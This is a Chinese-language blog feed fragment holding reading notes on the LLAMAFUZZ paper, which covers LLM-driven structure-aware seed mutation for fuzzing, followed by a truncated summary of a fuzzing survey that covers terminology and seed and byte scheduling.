        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>由于想要了解一下大语言模型在模糊测试领域的应用研究，所以经 Th3r 师傅的推荐来阅读一下这篇论文。不过由于本人英语很垃圾，所以就是拿小绿鲸一边翻译一边阅读。</p><blockquote><p>论文摘要：LLAMAFUZZ 是一篇研究在模糊测试中引入 LLM 的非常经典的论文。本文主要提出了通过 LLM 对种子进行生成，并且利用 LLM 的推理能力对种子进行结构化变异。通过 LLM 增强结构化数据模糊测试的能力。论文基于 LLM 预训练获得的数据格式转换知识生成有效新输入，并通过配对变异种子进行微调，使其高效掌握结构化格式与变异策略。</p></blockquote><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>这里就不对模糊测试的概念做介绍了，直接进入重点。</p><p>传统的<strong>模糊测试工具</strong>（以下简称 fuzzer）难以有效的生成结构化数据。比如 AFL++ 虽然结合了多种变异策略（如位翻转、字节插入删除等）和先进调度策略（如覆盖率引导的模糊测试），但是在处理需要严格结构化输入的应用程序时，其盲目的随机位级变异往往会破坏数据格式的完整性，导致产生大量无效的输入种子。因此，想要变异到一个对程序高覆盖率的种子来测试出 bug 需要非常长的时间。</p><blockquote><p>典型案例：测试PDF解析器时，AFL++ 需要平均 17 小时才能生成可通过基础校验的变异样本，而结构化感知方法仅需 23 分钟。</p></blockquote><p>因此，为了加快这个过程，honggfuzz 提出共享文件语料库，让 fuzzer 在多进程、多线程上运行，提高吞吐量，在有限的时间中生成更多的测试用例。但是，由于复杂的结构需求，一味的增加吞吐量和添加更多的随机突变策略会在突变结构化种子时产生瓶颈。AFL++ 和 honggfuzz 需要大量的尝试来变异有效的结构化种子。另一方面，由于随机化策略， fuzzer 表现出不稳定的结果。为了减轻这种不确定性，评估模糊测试需要重复试验以进行公平比较。然而，现实世界的 bug 是稀缺的， 即使是十次重复的试验也不能确保检测到 bug。</p><p>因为依赖随机性和覆盖率信息的 fuzzer 缺乏对测试种子的结构性意识。为了生成有价值的结构化二元种子，已经提出了使用预定义语法来创建结构化数据的专用 fuzzer。<strong>Gramatron</strong> 重构了语法结构，使其支持从输入状态空间的无偏采样，并允许更激进的突变操作。它将（Search-based Testing）与<strong>基于语法的模糊测试（Grammar-based Fuzzing）</strong> 相结合，在测试用例生成过程中同时优化探索路径与语法合法性。然而，Gramatron 依赖于 <strong>Chomsky 范式</strong>和 <strong>Greibach 范式</strong>，需要在其基础上附件规范来构建语法自动机，同时主要聚焦于 JSON 格式。另一种方法是基于块的变异。<strong>WEIZZ</strong> 提出了一种能够<strong>自动识别未知的基于块的二进制格式</strong>并进行有效变异的机制，适用于缺乏明确语法定义的目标。然而，WEIZZ 在处理如 JSON、XML 或编程语言这类<strong>强语法约束格式</strong>时存在困难。</p><p>因此，fuzzer 开发人员面临着使用通用 fuzzer 和专用 fuzzer 之间的权衡。通用的 fuzzer 虽然用途广泛，但往往难以有效地处理结构化的种子。另一方面，专向的 fuzzer 可以生产出高质量的结构化种子，但这种专向会限制其灵活性和适用性。 此外，依赖语法规则生成种子需要广泛的领域知识，这可能成为其广泛使用的障碍。因此，需要一种更好的方法来利用通用和专用模糊器的优势。</p><p>为了解决上述问题，论文提出使用大语言模型来增强模糊中的变异过程。下图提供了 LLAMAFUZZ 体系结构的概述。通过对不同数据集的LLM 进行预训练，LLM 可以学习复杂的数据转换模式和数据格式信息， 这对结构化数据突变至关重要。此外对 LLM 进行微调， 以学习特定的结构化种子模式和变异结构化种子，试图在通用 fuzzer 和专业 fuzzer 之间找到平衡。</p><figure>  <img src="/assets/Pasted%20image%2020250626212538.png" alt="系统架构图">  <figcaption><b>图 1：</b>LLAMAFUZZ 架构图。</figcaption></figure><p>本文主要做出了一下贡献：</p><ul><li>提出了一种 LLM 增强的突变策略，该策略可以应用 于基于二进制和基于文本的数据格式，只需微调步骤。</li><li>提供了通用 fuzzer 和专用 fuzzer 之间的解决方案， 可以学习结构化种子模式并对结构化种子进行突变。</li><li>提供了经验证据，证明 LLM 可以增强突变过程， 从而有利于模糊测试以提高代码覆盖率。</li><li>提供了实验解释来说明 LLM 如何增强模糊过程。</li><li>设计了一种轻量级的异步方法来利用 LLM 和模糊器， 允许 LLAMAFUZZ 轻松部署在单 GPU 或多 GPU 上。</li></ul><h2 id="0x02-背景"><a href="#0x02-背景" class="headerlink" title="0x02 背景"></a>0x02 背景</h2><p>介绍基于变异的模糊测试和覆盖率引导的灰盒模糊测试的背景。然后，提供了一些结构化数据模糊测试的当前解决方案。</p><h3 id="2-1-基于变异的模糊测试"><a href="#2-1-基于变异的模糊测试" class="headerlink" title="2.1 基于变异的模糊测试"></a>2.1 基于变异的模糊测试</h3><p>变异策略的目标是从给定的种子中生成新的测试用例，以发现以前未覆盖的程序区域。变异可以是随机的，即对种子进行任意更改。AFL++ 作为最先进的模糊测试工具，它使用三个阶段进行变异：</p><ul><li><strong>确定性阶段</strong>：包括不同长度的比特翻转，对小整数的加减操作，以及已知的 “有趣” 整数；</li><li><strong>扰乱阶段</strong>：随机多次选择变异操作符，并将其应用于种子内的多个随机位置；</li><li><strong>拼接阶段</strong>：将来自两个不同种子的片段组合成创建一个新的测试用例，并进一步在扰乱阶段中对其进行变异。</li></ul><p>基于变异的策略可以更广泛地探索输入空间，但其内在的随机性也带来了更大的不确定性和效率低下。因此，传统的灰盒模糊测试工具很难生成有效输入，往往需要指数级的时间才能深入探索创新行为。</p><p>本文提出一种利用 LLM 的方法，基于已有种子进行结构感知的变异。由于 LLM 能理解输入种子的结构，并在保持其有效性的前提下进行修改，因此该方法在加速漏洞发现、提升覆盖路径数量以及发现漏洞的总量方面展现出了显著效果。</p><h3 id="2-2-覆盖率引导的灰盒模糊测试"><a href="#2-2-覆盖率引导的灰盒模糊测试" class="headerlink" title="2.2 覆盖率引导的灰盒模糊测试"></a>2.2 覆盖率引导的灰盒模糊测试</h3><p>为克服基于变异的模糊测试中固有的随机性问题，研究人员提出使用位图（bit-map）记录覆盖信息，作为反馈来更有效地指导模糊测试过程 。由于漏洞通常隐藏在尚未被覆盖的执行路径中，因此扩大执行路径的覆盖范围被认为是提升模糊测试性能的合理方向。</p><p>对于一个被测试的程序和一组初始种子，覆盖引导的灰盒模糊测试主要包含以下四个阶段：</p><ol><li><strong>种子队列</strong>：从种子池中选择一个种子用于变异；</li><li><strong>种子变异</strong>：使用多种变异策略对选中的种子进行变异，生成新的测试用例；</li><li><strong>执行阶段</strong>：将当前测试用例输入目标程序执行；</li><li><strong>行为监测</strong>：将每个新的种子送入插桩过的程序中执行，并通过覆盖率指标进行评估；如果该种子触发了新的代码覆盖路径，则将其添加回种子队列，供进一步模糊测试使用。</li></ol><p>随着模糊测试循环的不断进行，更多的代码分支将被探索，从而有更大概率触发潜在的漏洞。</p><figure>  <img src="/assets/Pasted%20image%2020250629084732.png" alt="系统架构图">  <figcaption><b>图 2：</b>样本输入和LLM突变结果的PNG示例。</figcaption></figure><h3 id="2-3-结构化种子变异"><a href="#2-3-结构化种子变异" class="headerlink" title="2.3 结构化种子变异"></a>2.3 结构化种子变异</h3><p>覆盖引导的灰盒模糊测试在发现现实世界程序中的漏洞方面已被证明是有效的。然而，随着软件开发的日益复杂，越来越多的程序采用具有特殊格式的高度结构化数据，这对传统模糊测试技术提出了巨大挑战。传统的模糊测试工具主要在比特级别进行变异，在处理结构化数据时往往需要大量尝试才能实现有效变异。</p><p><strong>基于语法的模糊</strong>（Grammar-based fuzzing）提供了一种解决方案，通过人工指定的语法生成结构良好的种子。这种方法保证了输入在具备语法多样性的同时仍是语法合法的。</p><p>研究发现，以下三种语法感知的变异操作符在发现深层次漏洞时尤其有效：</p><ol><li><strong>随机变异（Random mutation）</strong>：选取一个随机的非叶子、非终结符节点，并生成一个新的上下文无关文法派生子树；</li><li><strong>随机递归展开（Random recursive unrolling）</strong>：查找递归的产生式规则，并将其展开最多 $n$ 次；</li><li><strong>拼接（Splicing）</strong>：将两个输入拼接在一起，同时保持其语法的合法性。</li></ol><p>这些结构化变异策略大幅提升了模糊测试在处理复杂输入格式时的有效性与效率。</p><h3 id="2-4-大语言模型"><a href="#2-4-大语言模型" class="headerlink" title="2.4 大语言模型"></a>2.4 大语言模型</h3><p>在近期的研究中，预训练的 LLM 在自然语言任务上表现出了令人印象深刻的表现，包括自然语言理解、推理、自然语言生成、多语言处理以及事实性判断等方面。</p><p>通过无监督学习，LLM 在海量文本数据上进行预训练，从而具备了广泛的通用知识。此外，凭借数十亿甚至数万亿的参数规模，LLMs 不仅能够捕捉上下文种的语言模式，还能够更深入地理解文本数据，例如文件中的格式信息和结构块信息。</p><p>这种能力使得 LLMs 的应用超越了传统<strong>自然语言处理</strong>（NLP）任务，其通用性已在多个领域得到验证，如视觉分类、蛋白质序列生成、代码生成。</p><p>在这种通用能力的基础上，LLMs 在解析和处理不同数据结构方面的内在能力，使其在模糊测试的<strong>变异阶段</strong>表现出特别的优势。</p><p>例如，CHATFUZZ 利用 LLMs 直接生成测试种子，但其应用目前仅限于面向文本格式的目标程序，如 JSON 和 XML。</p><p>此外，psamez 等人展示了<strong>压缩语言模型</strong>（Compressed-Language Models）可以理解由压缩文件格式编码的文件内容。</p><p>在实验中，LLMs 能够生成有价值的测试种子，这些种子在探索新的路径上起到了关键作用，从而帮助获得更好的<strong>边覆盖率</strong>（edge coverage）。</p><h2 id="0x03-设计思路"><a href="#0x03-设计思路" class="headerlink" title="0x03 设计思路"></a>0x03 设计思路</h2><h3 id="3-1-系统架构"><a href="#3-1-系统架构" class="headerlink" title="3.1 系统架构"></a>3.1 系统架构</h3><p>本文提出了 LLAMAFUZZ，一个基于 LLM 的灰盒模糊工具，旨在高效变异结构化数据。如图 1 所示，包括两个阶段：</p><ol><li>首先，利用成对的结构化数据对 LLM 进行微调，以使其能够理解底层的数据结构和变异转换方式；</li><li>然后，将 LLM 集成到模糊测试流程中，使其能够基于现有输入生成结构良好的种子。</li></ol><p>关键在于<strong>微调阶段</strong>，它使得 LLM 能够理解目标数据的结构和变异逻辑，从而通过微调实现对各种数据格式的适应。</p><p>工作流程包括三个部分：</p><ol><li><strong>微调准备</strong>：训练数据来自多种来源，包括 FuzzBench 实验数据和 AFL++ 的实验数据。此外，我们还引入了一种数据转换方法，允许 LLM 生成各种数据格式。</li><li><strong>用于变异的 LLM 微调</strong>。我们介绍了对 LLM 进行微调，然后利用 LLM 进行结构感知的变异操作。</li><li><strong>融合 fuzzer 和 LLM</strong>：我们展示了一种异步集成的方法，使 fuzzer 与 LLM 之间可以进行异步通信，提升整体效率和并发能力。</li></ol><h3 id="3-2-微调准备"><a href="#3-2-微调准备" class="headerlink" title="3.2 微调准备"></a>3.2 微调准备</h3><p>首先在多样化的大规模未标注语料库上进行<strong>生成式预训练</strong>（generative pre-training），然后针对特定任务进行<strong>判别式微调</strong>（discriminative fine-tuning）。</p><p>在基础模型的选择上，采用 llama-2-7b-chat-hf，该模型在大约 2 万亿个 token 上进行了预训练。</p><p>微调所用的数据来自于真实的模糊测试过程，利用这些数据训练 LLM 理解结构化数据的模式和变异方式，从而使其能够在保持原始结构的同时，对给定种子进行有效修改，生成具有价值的新测试种子。</p><h4 id="3-2-1-微调数据收集"><a href="#3-2-1-微调数据收集" class="headerlink" title="3.2.1 微调数据收集"></a>3.2.1 微调数据收集</h4><p>为了使 LLM 能够理解数据结构并生成结构化的测试种子，首先需要构建一个训练数据集。</p><p>具体而言，从 FuzzBench 的实验数据和 AFL++ 的模糊测试数据中收集有价值的种子，满足：</p><ol><li>能触发新的新的路径；</li><li>拥有不同的命中次数；</li><li>能触发程序崩溃。</li></ol><p>这些标准的理由很直观：</p><ul><li>提升代码覆盖率可以帮助 fuzzer 探索更多未访问的路径，因为漏洞往往隐藏在尚未执行的路径中。</li><li>拥有不同命中次数的种子虽然不一定提升覆盖率，但可能以不同的方式执行程序，进而发现已覆盖路径中的新漏洞；</li><li>而触发崩溃的种子本身就具备极高的价值，是模糊测试的直接目标。</li></ul><h4 id="3-2-2-数据转换和预处理"><a href="#3-2-2-数据转换和预处理" class="headerlink" title="3.2.2 数据转换和预处理"></a>3.2.2 数据转换和预处理</h4><p>为了构建通用的种子变异模型，将二进制输入文件转换为统一的十六进制表示。进行这种转换的原因如下：</p><ol><li><strong>目标适配多种数据格式</strong>：希望 LLAMAFUZZ 能够处理各种不同格式的数据。然而，为每种格式定制读取方式在实践中并不可行，因此我们需要一种统一的数据读取方式。</li><li><strong>适配 LLM 的输入特性</strong>：传统 fuzzer 对二进制种子进行比特级操作，而 LLM 则通常以自然语言为输入。因此，有必要将训练数据转换为 LLM 可以理解的格式。</li><li><strong>保持转换效率</strong>：数据的转换过程必须高效和快速，因为缓慢的转换过程会直接影响模糊测试的吞吐量。</li></ol><p>与其它编码方式（如 Base64）相比，十六进制编码更直观、易于实现，并且便于从二进制文件中直接转换。</p><blockquote><p>需要注意的是：这种数据转换仅适用于基于二进制的数据。<br>对于文本类型的数据，仅在种子前添加 prompt，因此已有研究表明 LLM 能很好地处理基于文本的种子。</p></blockquote><figure>  <img src="/assets/Pasted%20image%2020250629083827.png" alt="系统架构图">  <figcaption><b>图 3：</b>数据集预处理的工程流程。</figcaption></figure><p>如图 3 所示，数据转换方法包括以下几个步骤：</p><ol><li><strong>初始转换</strong>：首先，将二进制种子文件转换为十六进制表示。</li><li><strong>生成 token</strong>：随后，每两个连续的十六进制字符将组成一个 token，从而减少输入字符串的 token 总数。</li><li><strong>添加提示词</strong>：最后，我们为每条微调数据添加 prompt，以使 LLM 更清除其任务目标。</li></ol><p>除了数据转换之外，还引入了噪声数据到训练集中，以降低过拟合和训练数据重放的风险。</p><p>在训练数据的组织形式上，每条数据都是一对种子：原始种子与其对应的变异版本。</p><p>这种结构设计旨在帮助 LLM 学习：</p><ul><li>种子的变异转换模式。</li><li>以及数据格式的底层结构。</li></ul><h3 id="3-3-针对变异的微调-LLM"><a href="#3-3-针对变异的微调-LLM" class="headerlink" title="3.3 针对变异的微调 LLM"></a>3.3 针对变异的微调 LLM</h3><p>本节描述了对 LLM 进行微调，然后利用 LLM 进行结构感知突变的方法。</p><h4 id="3-3-1-微调"><a href="#3-3-1-微调" class="headerlink" title="3.3.1 微调"></a>3.3.1 微调</h4><p>对预训练模型进行微调是一种常见的策略，用于使模型在特定下游任务中表现得更加专业。同样，在利用通用 LLM 进行结构化数据变异时，监督式微调也是必要的。这个过程建立在预训练模型的一般理解之上，并通过监督学习使其适应特定的任务。在监督微调期间，LLM 可以根据特定任务损失得出的梯度来调整权重。因此，我们可以使用监督微调来教 LLM 理解输入语法和输出变异。</p><p>进行微调的第一步是准备有效的提示，图 3 右侧的 Pair 1到 Pair n为模型提供了对结构化数据进行变异的示例和相应的变异结果。在这个提示符中，fuzzer 以十六进制表示提供了当前的结构化数据和期望的变异结果。随后，强调格式关键字，允许 LLM 从预训练的知识中获取对格式的一般理解来进行变异。不过，LLM 可能偶尔会产生随机输出，不过这种行为相对罕见，不会对整个 Fuzzing 过程产生重大影响。由于这些响应通常是无效的，因此它们很容易被 fuzzer 忽略，而不会影响结果。</p><p>图 2 展示了一个由 LLM 变异的 PNG 种子示例，其中用红色突出显示的字节是 LLM 完成的突变。在这个例子中，PNG 文件被构造成 PNG 签名、IHDR、gAMA和原始数据块。签名通常被称为文件头，由固定的 8 个字节组成，标志着文件的开始。紧跟着签名的 IHDR 块是至关重要的，因为它包含基本的图像信息，如宽度、高度、位深、颜色类型、压缩方法、滤波方法和隔行方法，gAMA 块指定图像和所需显示输出之间的关系。后续块在本质上通常是辅助的。在 IHDR 之后，PNG 文件包含几个辅助块。</p><p>在这个例子中，LLM 选择性地修改 IHDR、gAMA和数据块。它不仅保留了原始数据格式的完整性，还引入了有效的修改，增强了种子触发漏洞的潜力。</p><h4 id="3-3-2-生成"><a href="#3-3-2-生成" class="headerlink" title="3.3.2 生成"></a>3.3.2 生成</h4><p>下一步是将来自 fuzzer 的当前种子结合提示词作为 LLM 的输入。提示词用于引导 LLM 生成与其微调阶段所实验格式保持一致的变异内容。LLM 生成响应后，输出结果会被解析并转换回二进制格式。我们期望生成的内容是对原始种子的结构化变异，即在保持原始输入结构完整性的前提下，产生有意义的变异种子。</p><h3 id="3-4-整合fuzzer和LLM"><a href="#3-4-整合fuzzer和LLM" class="headerlink" title="3.4 整合fuzzer和LLM"></a>3.4 整合fuzzer和LLM</h3><p>对于灰盒 fuzzer 来说，速度是至关重要的，它能够每秒执行数百甚至数千个种子。任何额外集成流程（如基于 LLM 的变异机制）都可能影响整体吞吐量，进而降低模糊测试的效能。尤其是 LLM 生成过程存在显著的性能瓶颈：其速度更慢且计算密集，主要依赖大量 CPU 资源。</p><p>为了解决这一速度不匹配的问题，论文设计了 LLM 与 fuzzer 之间的异步通信机制。具体实现流程如下：首先将当前种子快速转换为十六进制格式；随后 fuzzer 在向 LLM 发送种子的同时，持续接收 LLM 返回的新种子；LLM 完成种子变异后立即回传新种子供后续测试。该异步架构完全消除了等待延迟，使得 fuzzer 能够持续保持高速运行状态，无需阻塞等待 LLM 完全变异任务。通过将高速测试流程与低速 LLM 变异过程解耦，在不损失测试效率的前提下，成功实现了 LLM 对 fuzzer 的能力增强。</p><h2 id="0x04-实验"><a href="#0x04-实验" class="headerlink" title="0x04 实验"></a>0x04 实验</h2><p>论文扩展 AFL++ 实现了 LLAMAFUZZ，通过异步方法在 fuzzer 和 LLM 之间进行通信。通过修改 AFL++ 源代码以纳入 LLAMAFUZZ 的功能，如消息队列和种子评估。为了解决 fuzzer 和 LLM 之间的生成速度不匹配问题，将消息队列长度限制为 30。这种调整确保了 LLM 总是在最近的种子上进行变异，保持了变异的实时性和有效性。</p><p>为了收集足够多样的微调数据，并满足 LLM 最大 token 限制，将十六进制对的最大长度设置为 4096。这个限制对应于 LLM 的最大 token 容量。论文选择了 llama2-7b-chat-hf，这是最先进的 LLM 之一，在硬件上功能强大且高效。</p><p>实验结果表明，LLAMAFUZZ 在多个基准测试程序和真实世界目标程序上均表现出明显优于传统 fuzzer 的测试效果，特别是在代码路径探索和触发崩溃方面。</p><p>未来的研究可以进一步探索 LLM 如何<strong>从已有种子的表现中学习其与新行为触发的关系</strong>，从而增强模糊测试过程的智能决策能力。在 fuzzing 中，能触发新的覆盖路径或错误状态的种子被视为有价值的，因此，理解<strong>种子与代码覆盖提升之间的联系</strong>对于提升整个测试流程的效率至关重要。</p><p>类似于传统的随机测试工具如 <strong>Csmith</strong>，其通过系统地生成覆盖 C 语言大子集的合法测试程序，并规避未定义行为，有效提升了对 C&#x2F;C++ 编译器的测试覆盖率。未来，结合语义感知与结构化输入的 LLM 可望在更复杂场景下生成类似高质量测试用例。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ul><li><p><strong>Fuzzing</strong>：Fuzzing 是一种自动化的随机软件测试技术，用于发现目标程序 或应用程序中的漏洞和错误。</p><ul><li><strong>白盒</strong>：白盒 fuzzer 利用程序分析来提高代码覆盖率，以探索某些代码区域，这可以有效地揭示复杂逻辑中的漏洞。</li><li><strong>黑盒</strong>：黑盒 fuzzer 的目标是二进制程序，它不知道程序结构。黑盒 fuzzer 因为随机生成测试输入，所以执行量很高，但它只触及表面。</li><li><strong>灰盒</strong>：灰盒 fuzzer 结合了白盒模糊器的有效性和黑盒模糊器的效率，它利用插桩从目标程序获得反馈，从而产生更有价值的种子，提高代码覆盖率。</li></ul></li><li><p><strong>结构数据变异 Fuzzing</strong>：在需要结构化输入的应用程序中，上述方法的盲目随机变异策略往往会破坏数据格式的完整性，导致生成大量低效和无效的种子。结构化数据变异的语法引导 fuzzer 以准确识别目标输入格式。</p></li><li><p><strong>机器学习增强 Fuzzing</strong>：目前机器学习增强 Fuzzing 的研究主要在两个方面：</p><ul><li>利用机器学习模型作为生成器。</li><li>利用机器学习模型来引导 Fuzzing 过程。</li></ul></li></ul><p>输入种子变异是直接影响模糊测试性能的灰盒模糊测试关键步骤。虽然随机比特级变异在许多情况下有效，但是很多情况下在测试结构化要求的目标时面临着巨大的挑战。这些因为当前基于变异的 fuzzer 需要极多的尝试来变异有效的高度结构化数据，且变异高度依赖随机性。</p><p>本文提出利用大语言模型学习结构化数据的模式并进行种子变异。基于该理论构建了 LLAMAFUZZ，并证明大语言模型在结构感知变异中具有高效性和有效性。</p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文笔记：Fuzzing: A Survey for Roadmap</title>
      <link href="/2025/07/01/fuzz/paper/roadmap/"/>
      <url>/2025/07/01/fuzz/paper/roadmap/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Fuzz testing（fuzzing，即模糊测试）在检测安全漏洞中大放异彩，其通过生成大量的测试用例（test cases）并观测执行结果来寻找漏洞，并且已在大量的应用中发现了上千个漏洞。虽然非常高效，fuzz 仍缺乏系统化的对其缺陷的分析。</p><ul><li>fuzz 需要缩小输入空间（input space）与缺陷空间（defect space，触发缺陷的输入）间的差距；在一个应用当中，漏洞（defects）的存在是分散的（spare），这意味着 defects space 要比 input space 小得多。</li><li>fuzzing 生成大量的测试用例进行重复测试——这需要一种自动化的方法；由于查询与漏洞的复杂性，自动化地执行不同的程序会是一个挑战。</li></ul><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>软件漏洞是计算机系统中的一个严重的问题，而 Fuzz testing 已经成为最成功的检测程序漏洞的方法之一，其通过生成大量的测试用例来重复测试目标程序并观察其异常（exception）——安全漏洞的标志（indicator）</p><p>Fuzzing 通常有着一组种子（seeds）：interesting inputs，新的输入的生成则基于这组种子进行无限的变异（mutate）</p><p>虽然 fuzzing 在发现安全漏洞上获得了巨大的成功，在开发高效的漏洞检测方案上仍存在着缺陷，如 Fig.1 所示，三个主要的缺陷是：输入中分散的漏洞空间，严格的有效输入空间，多目标的自动化执行。</p><p><img src="/assets/Pasted%20image%2020250621145238.png"></p><ul><li><strong>Gap 1: spare defect space of inputs.</strong> 在应用程序中的漏洞分布是分散的，而仅有部分特定的输入能够触发漏洞；浅显的漏洞可以在短时间内被 fuzz 到，但许多安全漏洞需要测试复杂的执行路径并解决严格的路径约束，因此一个高效的 fuzzing 算法需要同时对 <em>待测试程序</em> （program under test， <strong>PUTs</strong>）与 <em>安全缺陷</em> （security flaws）足够精通，以在一个更有可能存在漏洞的代码区域驱动计算资源</li><li><strong>Gap 2: strict valid input space.</strong> 大部分程序有着自己的输入空间，而现代程序都相当复杂，需要更复杂的特化输入空间，因此如何生成有效输入同样是个挑战；此外，为了提高 fuzzing 的效率，生成的输入应当使用不同的执行状态（例如 <em>代码覆盖率</em> ），这需要更先进的方案来生成有效输入；若缺乏对 PUTs 的系统化分析，几乎不可能精确地限制输入空间（例如 PDF 文件的变异生成可能会违反 PDF 规范）</li><li><strong>Gap 3: various target.</strong> 由于 fuzzing 大量重复地测试 PUTs，这需要高效的自动化方法。PUTs 与漏洞都是多种多样的，有的程序可以简单直接地被自动化地 fuzz（例如命令行程序），但许多程序在自动化测试前都需要做大量的工作（例如硬件）；此外，安全缺陷同样需要自动化的 indicator 以记录潜在的真正漏洞，<strong>程序崩溃</strong>是一个常用的 indicator 因为其可以被 OS 自动捕获，但有的安全缺陷<strong>并不会表现出崩溃</strong>（例如条件竞争），这需要精心设计的 indicator</li></ul><p>业界在缩小这些缺陷上做出了许多努力。在本篇论文中，研究者系统化地回顾与分析了 fuzzing 的缺陷与解决方案，同时考虑了广度与深度。</p><h2 id="0x02-Fuzzing-概述"><a href="#0x02-Fuzzing-概述" class="headerlink" title="0x02 Fuzzing 概述"></a>0x02 Fuzzing 概述</h2><p><img src="/assets/Pasted%20image%2020250628152009.png"></p><p>首先介绍一些术语（<strong>Terminologies</strong>），如 Fig2 所示：</p><ul><li><strong>seed</strong>：被保留的能完成更好的 fitness 的输入（例如提供新的覆盖率）</li><li><strong>fitness</strong>：对一个 input&#x2F;seed 的质量的测量</li><li><strong>power schedule</strong>：决定了分配给 seeds 的 energy</li><li><strong>energy</strong>：分配给当前 fuzzing round 的变异数量</li><li><strong>fuzzer</strong>：fuzzing 算法的实现</li></ul><p>如 Fig2 所示，fuzzing 由三部分组成：</p><ul><li><strong>input generator</strong>：负责向 executor 提供输入</li><li><strong>executor</strong>：负责执行输入</li><li><strong>defect monitor</strong>：负责检查是否发现了新的执行状态或缺陷（例如crashes）</li></ul><p>基于输入的生成方式，fuzzing 可以分为：</p><ul><li><strong>基于生成的</strong>（generation-based）：基于 <em>文法</em> （grammars）或 <em>有效语料库</em> （valid corpus）从头开始生成；如 Fig2 所示，其从一组种子中直接获得输入</li><li><strong>基于变异的</strong>（mutation-based）：对现有的种子进行 <em>变异</em> （mutate）以获得新的输入；对给定的一组种子，基于变异的模糊测试通过 seed schedule、byte schedule、mutation schedule 以获得输入</li></ul><blockquote><p>需要注意的是，fuzzing 并不需要经历 Fig2 中的所有步骤，例如基于生成的模糊测试并不执行 byte schedule 或 mutation schedule，但关注于从初始输入文件中选择最优的种子组。</p></blockquote><p>基于执行时观测到的信息量，fuzzing 可以分为：</p><ul><li><strong>黑盒</strong>（blackbox）：黑盒模糊测试并不知道每次执行的内部状态，通过使用输入格式化或不同的输入状态来进行优化</li><li><strong>白盒</strong>（whitebox）：白盒模糊测试对每次执行的内部状态是全部得知的，这使其能系统化地探索目标程序的状态空间；其通常使用 concolic execution（例如 dynamic symbolic execution，即动态符号执行）来分析目标程序</li><li><strong>灰盒</strong>（greybox）：灰盒模糊测试获得的执行状态信息在黑盒与白盒之间，例如许多 fuzzer 都使用<strong>边界覆盖率</strong>（edge coverage）作为内部执行状态。</li></ul><p>最通用的执行状态便是代码覆盖率（code coverage，例如 CFGs）</p><h2 id="0x03-Fuzzing-理论"><a href="#0x03-Fuzzing-理论" class="headerlink" title="0x03 Fuzzing 理论"></a>0x03 Fuzzing 理论</h2><p>为了提高发现漏洞的概率，fuzzer 在执行过程中使用反馈（feedback）机制，例如以执行状态或结果作为 fitnes，一个典型的 fitness 便是基于代码覆盖率（例如基本块或边）进行输入生成，但仅有代码覆盖率<strong>并非一直都是可靠的</strong>，就算可靠也可能收益不高（例如指数型数量的输入生成可能只带来线性的漏洞发现），因此一种常见的改进方法是优化模糊测试的过程或是为 fitness 丰富信息，Table 1 展示了不同的 fuzzer 的优化方法：</p><p><img src="/assets/Pasted%20image%2020250628153048.png"></p><h3 id="3-1-种子集选择"><a href="#3-1-种子集选择" class="headerlink" title="3.1 种子集选择"></a>3.1 种子集选择</h3><p>对种子集的优化关注于<strong>最小化种子集的大小</strong>，例如选择能覆盖所有已发现代码覆盖的一组最少的种子，因为过于富集的种子会在检验已探测代码区域上浪费计算资源</p><blockquote><p>在 <a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/rebert">UESIX 的一篇论文</a> 中其被表述为 <em>最小覆盖集问题</em> （minimal set coverage problem，MSCP）</p></blockquote><h3 id="3-2-种子调度"><a href="#3-2-种子调度" class="headerlink" title="3.2 种子调度"></a>3.2 种子调度</h3><p><strong>种子调度</strong>（Seed Schedule）期望解决如下问题：</p><ul><li>在下一轮中选择哪个种子</li><li>为该种子分配的时间预算（time budget）；大部分 fuzzer 实际上选择优化对被选取种子的变异次数</li></ul><p>由于 PUTs 与漏洞的复杂性，未发现代码覆盖率与未发现漏洞是不可知的，我们无法知道一个输入是否能触发漏洞，类似地在检索代码之前我们也不能获得程序行为的概率分布，因此数学上我们几乎不可能找到一个全面的优化解法，因此研究人员基于多种优化方法来近似地解决这个问题</p><h4 id="3-2-1-Fitness-by-Bugs"><a href="#3-2-1-Fitness-by-Bugs" class="headerlink" title="3.2.1 Fitness by Bugs"></a>3.2.1 Fitness by Bugs</h4><h4 id="3-2-2-Fitness-by-State-Transition（Markov-Chain）"><a href="#3-2-2-Fitness-by-State-Transition（Markov-Chain）" class="headerlink" title="3.2.2 Fitness by State Transition（Markov Chain）"></a>3.2.2 <em>Fitness by State Transition（Markov Chain）</em></h4><h3 id="3-3-字节调度"><a href="#3-3-字节调度" class="headerlink" title="3.3 字节调度"></a>3.3 字节调度</h3><p><strong>字节调度</strong>（Byte Schedule）决定了 <em>选择种子中一个字节来变异</em> 的频率。大部分 fuzzer 基于执行信息来试探性地或随机地选择字节，这需要比 seed schedule 对程序行为有着更深刻的了解（例如路径约束或数据流），由此 fuzzer 可以关注于一个不那么复杂的问题——字节如何影响模糊测试的过程，称为字节的<strong>重要性</strong>（importance）</p><h3 id="3-4-Mutation-Operator-Schedule"><a href="#3-4-Mutation-Operator-Schedule" class="headerlink" title="3.4 Mutation Operator Schedule"></a>3.4 Mutation Operator Schedule</h3><h3 id="3-5-Diverse-Information-For-Fitness"><a href="#3-5-Diverse-Information-For-Fitness" class="headerlink" title="3.5 Diverse Information For Fitness"></a>3.5 Diverse Information For Fitness</h3><h3 id="3-6-Evaluation-Theory"><a href="#3-6-Evaluation-Theory" class="headerlink" title="3.6 Evaluation Theory"></a>3.6 Evaluation Theory</h3><h2 id="0x04-搜索输入空间"><a href="#0x04-搜索输入空间" class="headerlink" title="0x04 搜索输入空间"></a>0x04 搜索输入空间</h2><p>为了缩小输入空间、提升模糊测试的性能，fuzzers 将一个输入中的关联字节分组并为每一组使用特定的变异器（包括字节变异与块变异）</p><p>在路径约束求解中，对关联字节的关注同样能缩小搜索空间。</p><h3 id="4-1-Byte-constraint-Relation"><a href="#4-1-Byte-constraint-Relation" 